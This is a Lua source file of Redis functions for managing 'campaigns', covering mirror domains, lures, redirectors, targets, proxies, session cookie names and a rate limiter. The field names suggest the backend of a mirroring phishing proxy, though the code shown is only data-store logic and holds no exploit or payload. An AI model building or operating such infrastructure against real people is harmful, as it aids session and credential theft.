--
-- Campaign methods
--

local function create_campaign(keys, raw_args)
  if #keys ~= 4 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_mirror_domains_key = keys[2]
  local campaign_session_cookie_names_key = keys[3]
  local campaign_index_key = keys[4]

  local args, args_err = normalize(raw_args, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'mirror_domain', kind = 'str' },
    { name = 'description', kind = 'any' },
    { name = 'crypt_secret', kind = 'str' },
    { name = 'upgrade_session_path', kind = 'str' },
    { name = 'session_cookie_name', kind = 'str' },
    { name = 'session_expire', kind = 'int', min = 1000 },
    { name = 'new_session_expire', kind = 'int', min = 1000 },
    { name = 'message_expire', kind = 'int', min = 1000 },
    { name = 'limiter_burst', kind = 'int', min = 1, max = 1000 },
    { name = 'limiter_rate', kind = 'int', min = 1, max = 100 },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if args.new_session_expire > args.session_expire then
    return redis.error_reply('ERR new_session_expire exceeds session_expire')
  end

  local now = current_time()

  if redis.call('EXISTS', campaign_key) == 1 then
    return redis.status_reply('CONFLICT campaign already exists')
  end

  if redis.call('SISMEMBER', campaign_mirror_domains_key, args.mirror_domain) == 1 then
    return redis.status_reply('CONFLICT campaign mirror_domain already taken')
  end

  if redis.call('SISMEMBER', campaign_session_cookie_names_key, args.session_cookie_name) == 1 then
    return redis.status_reply('CONFLICT campaign session_cookie_name already taken')
  end

  -- Point of no return

  -- stylua: ignore
  redis.call(
    'HSET', campaign_key,
    'campaign_id', args.campaign_id,
    'mirror_domain', args.mirror_domain,
    'description', args.description,
    'crypt_secret', args.crypt_secret,
    'upgrade_session_path', args.upgrade_session_path,
    'session_cookie_name', args.session_cookie_name,
    'session_expire', args.session_expire,
    'new_session_expire', args.new_session_expire,
    'message_expire', args.message_expire,
    'limiter_burst', args.limiter_burst,
    'session_count', 0,
    'message_count', 0,
    'created_at', now
  )

  redis.call('SADD', campaign_mirror_domains_key, args.mirror_domain)
  redis.call('SADD', campaign_session_cookie_names_key, args.session_cookie_name)
  redis.call('ZADD', campaign_index_key, now, args.campaign_id)

  return redis.status_reply('OK campaign created')
end

redis.register_function({
  function_name = 'create_campaign',
  callback = create_campaign,
  description = 'Create campaign',
})

local function read_campaign(keys, args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]

  if #args ~= 0 then
    return redis.error_reply('ERR wrong number of args')
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return nil
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id',
    'mirror_domain',
    'session_count',
    'message_count',
    'created_at'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'mirror_domain', kind = 'str' },
    { name = 'session_count', kind = 'int', min = 0 },
    { name = 'message_count', kind = 'int', min = 0 },
    { name = 'created_at', kind = 'int', min = 0 },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  campaign.is_locked = redis.call('EXISTS', campaign_lock_key) == 1

  return { map = campaign }
end

redis.register_function({
  function_name = 'read_campaign',
  callback = read_campaign,
  flags = { 'no-writes' },
  description = 'Read campaign',
})

local function read_full_campaign(keys, args)
  if #keys ~= 10 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local campaign_flags_key = keys[3]
  local campaign_session_cookie_names_key = keys[4]
  local proxy_index_key = keys[5]
  local target_index_key = keys[6]
  local redirector_index_key = keys[7]
  local lure_index_key = keys[8]
  local session_history_key = keys[9]
  local message_history_key = keys[10]

  if #args ~= 0 then
    return redis.error_reply('ERR wrong number of args')
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return nil
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id',
    'mirror_domain',
    'description',
    'crypt_secret',
    'upgrade_session_path',
    'session_cookie_name',
    'session_expire',
    'new_session_expire',
    'message_expire',
    'limiter_burst',
    'limiter_rate',
    'session_count',
    'message_count',
    'created_at'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'mirror_domain', kind = 'str' },
    { name = 'description', kind = 'any' },
    { name = 'crypt_secret', kind = 'str' },
    { name = 'upgrade_session_path', kind = 'str' },
    { name = 'session_cookie_name', kind = 'str' },
    { name = 'session_expire', kind = 'int', min = 1000 },
    { name = 'new_session_expire', kind = 'int', min = 1000 },
    { name = 'message_expire', kind = 'int', min = 1000 },
    { name = 'limiter_burst', kind = 'int', min = 1, max = 1000 },
    { name = 'limiter_rate', kind = 'int', min = 1, max = 100 },
    { name = 'session_count', kind = 'int', min = 0 },
    { name = 'message_count', kind = 'int', min = 0 },
    { name = 'created_at', kind = 'int', min = 0 },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  campaign.session_cookie_names = redis.call('SMEMBERS', campaign_session_cookie_names_key)
  campaign.is_locked = redis.call('EXISTS', campaign_lock_key) == 1
  campaign.flags = redis.call('SMEMBERS', campaign_flags_key)
  campaign.proxy_index = redis.call('ZCARD', proxy_index_key)
  campaign.target_index = redis.call('ZCARD', target_index_key)
  campaign.redirector_index = redis.call('ZCARD', redirector_index_key)
  campaign.lure_index = redis.call('ZCARD', lure_index_key)
  campaign.session_history = redis.call('ZCARD', session_history_key)
  campaign.message_history = redis.call('ZCARD', message_history_key)

  return { map = campaign }
end

redis.register_function({
  function_name = 'read_full_campaign',
  callback = read_full_campaign,
  flags = { 'no-writes' },
  description = 'Read full campaign',
})

local function read_campaign_index(keys, args)
  if #keys ~= 1 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_index_key = keys[1]

  if #args ~= 0 then
    return redis.error_reply('ERR wrong number of args')
  end

  return redis.call('ZRANGE', campaign_index_key, 0, -1)
end

redis.register_function({
  function_name = 'read_campaign_index',
  callback = read_campaign_index,
  flags = { 'no-writes' },
  description = 'Read campaign index',
})

local function lock_campaign(keys, raw_args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]

  local args, args_err = normalize(raw_args, {
    { name = 'lock_secret', kind = 'str' },
    { name = 'lock_timeout', kind = 'int', min = 1000 },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 1 then
    return redis.status_reply('FORBIDDEN campaign already locked')
  end

  -- Point of no return

  redis.call('SET', campaign_lock_key, args.lock_secret, 'PX', args.lock_timeout)

  return redis.status_reply('OK campaign locked')
end

redis.register_function({
  function_name = 'lock_campaign',
  callback = lock_campaign,
  description = 'Lock campaign',
})

local function unlock_campaign(keys, raw_args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]

  local args, args_err = normalize(raw_args, {
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('OK campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  -- Point of no return

  redis.call('DEL', campaign_lock_key)

  return redis.status_reply('OK campaign unlocked')
end

redis.register_function({
  function_name = 'unlock_campaign',
  callback = unlock_campaign,
  description = 'Unlock campaign',
})

local function update_campaign(keys, raw_args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]

  local args, args_err = normalize(raw_args, {
    { name = 'description', kind = 'any' },
    { name = 'session_expire', kind = 'int', min = 1000 },
    { name = 'new_session_expire', kind = 'int', min = 1000 },
    { name = 'message_expire', kind = 'int', min = 1000 },
    { name = 'limiter_burst', kind = 'int', min = 1, max = 1000 },
    { name = 'limiter_rate', kind = 'int', min = 1, max = 100 },
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if args.new_session_expire > args.session_expire then
    return redis.error_reply('ERR new_session_expire exceeds session_expire')
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  -- Point of no return

  -- stylua: ignore
  redis.call(
    'HSET', campaign_key,
    'description', args.description,
    'session_expire', args.session_expire,
    'new_session_expire', args.new_session_expire,
    'message_expire', args.message_expire,
    'limiter_burst', args.limiter_burst,
    'limiter_rate', args.limiter_rate
  )

  return redis.status_reply('OK campaign updated')
end

redis.register_function({
  function_name = 'update_campaign',
  callback = update_campaign,
  description = 'Update campaign',
})

local function append_campaign_flag(keys, raw_args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_flags_key = keys[2]

  local args, args_err = normalize(raw_args, {
    { name = 'flag', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('SISMEMBER', campaign_flags_key, args.flag) == 1 then
    return redis.status_reply('OK campaign flag already exists')
  end

  -- Point of no return

  redis.call('SADD', campaign_flags_key, args.flag)

  return redis.status_reply('OK campaign flag appended')
end

redis.register_function({
  function_name = 'append_campaign_flag',
  callback = append_campaign_flag,
  description = 'Append campaign flag',
})

local function remove_campaign_flag(keys, raw_args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_flags_key = keys[2]

  local args, args_err = normalize(raw_args, {
    { name = 'flag', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('SISMEMBER', campaign_flags_key, args.flag) == 0 then
    return redis.status_reply('OK campaign flag not exists')
  end

  -- Point of no return

  redis.call('SREM', campaign_flags_key, args.flag)

  return redis.status_reply('OK campaign flag removed')
end

redis.register_function({
  function_name = 'remove_campaign_flag',
  callback = remove_campaign_flag,
  description = 'Remove campaign flag',
})

local function delete_campaign(keys, raw_args)
  if #keys ~= 12 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local campaign_flags_key = keys[3]
  local campaign_mirror_domains_key = keys[4]
  local campaign_session_cookie_names_key = keys[5]
  local campaign_index_key = keys[6]
  local proxy_index_key = keys[7]
  local target_index_key = keys[8]
  local redirector_index_key = keys[9]
  local lure_index_key = keys[10]
  local session_history_key = keys[11]
  local message_history_key = keys[12]

  local args, args_err = normalize(raw_args, {
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id',
    'mirror_domain',
    'session_cookie_name'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'mirror_domain', kind = 'str' },
    { name = 'session_cookie_name', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if redis.call('ZCARD', proxy_index_key) > 0 then
    return redis.status_reply('FORBIDDEN campaign proxies exists')
  end

  if redis.call('ZCARD', target_index_key) > 0 then
    return redis.status_reply('FORBIDDEN campaign targets exists')
  end

  if redis.call('ZCARD', redirector_index_key) > 0 then
    return redis.status_reply('FORBIDDEN campaign redirectors exists')
  end

  if redis.call('ZCARD', lure_index_key) > 0 then
    return redis.status_reply('FORBIDDEN campaign lures exists')
  end

  -- Point of no return

  redis.call(
    'DEL',
    campaign_key,
    campaign_lock_key,
    campaign_flags_key,
    session_history_key,
    message_history_key
  )
  redis.call('SREM', campaign_mirror_domains_key, campaign.mirror_domain)
  redis.call('SREM', campaign_session_cookie_names_key, campaign.session_cookie_name)
  redis.call('ZREM', campaign_index_key, campaign.campaign_id)

  return redis.status_reply('OK campaign deleted')
end

redis.register_function({
  function_name = 'delete_campaign',
  callback = delete_campaign,
  description = 'Delete campaign',
})

local function check_campaign_limiter(keys, raw_args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_limiter_key = keys[2]

  local args, args_err = normalize(raw_args, {
    { name = 'limiter_cost', kind = 'num', min = 0.001, max = 1000 },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  local now = current_time()

  if redis.call('EXISTS', campaign_key) == 0 then
    return nil
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'limiter_burst',
    'limiter_rate'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'limiter_burst', kind = 'int', min = 1, max = 1000 },
    { name = 'limiter_rate', kind = 'int', min = 1, max = 100 },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if args.limiter_cost > campaign.limiter_burst then
    return redis.error_reply('ERR limiter_cost exceeds limiter_burst')
  end

  -- Point of no return

  if redis.call('EXISTS', campaign_limiter_key) == 0 then
    -- stylua: ignore
    redis.call(
      'HSET', campaign_limiter_key,
      'tokens', campaign.limiter_burst,
      'ts', now
    )
  end

  -- stylua: ignore
  local raw_limiter = redis.call(
    'HMGET', campaign_limiter_key,
    'tokens',
    'ts'
  )

  local limiter, limiter_err = normalize(raw_limiter, {
    { name = 'tokens', kind = 'num', min = 0 },
    { name = 'ts', kind = 'int', min = 0 },
  })

  if limiter_err then
    return redis.error_reply('ERR normalize limiter: ' .. limiter_err)
  end

  limiter.tokens = math.min(campaign.limiter_burst, limiter.tokens)

  local elapsed = math.max(0, now - limiter.ts) / 1000
  limiter.tokens =
    math.min(campaign.limiter_burst, limiter.tokens + elapsed * campaign.limiter_rate)

  limiter.ts = now

  local is_allowed, retry_after

  if limiter.tokens >= args.limiter_cost then
    limiter.tokens = limiter.tokens - args.limiter_cost

    is_allowed = true
    retry_after = 0
  else
    is_allowed = false
    retry_after = math.ceil((args.limiter_cost - limiter.tokens) / campaign.limiter_rate * 1000)
  end

  limiter.tokens = math.max(0, limiter.tokens)

  local limiter_ttl = math.ceil((campaign.limiter_burst / campaign.limiter_rate) * 1000) + 1000

  -- stylua: ignore
  redis.call(
    'HSET', campaign_limiter_key,
    'tokens', limiter.tokens,
    'ts', limiter.ts
  )

  redis.call('PEXPIRE', campaign_limiter_key, limiter_ttl)

  return {
    map = {
      is_allowed = is_allowed,
      tokens = limiter.tokens,
      ts = limiter.ts,
      cost = args.limiter_cost,
      retry_after = retry_after,
    },
  }
end

redis.register_function({
  function_name = 'check_campaign_limiter',
  callback = check_campaign_limiter,
  description = 'Check campaign limiter',
})
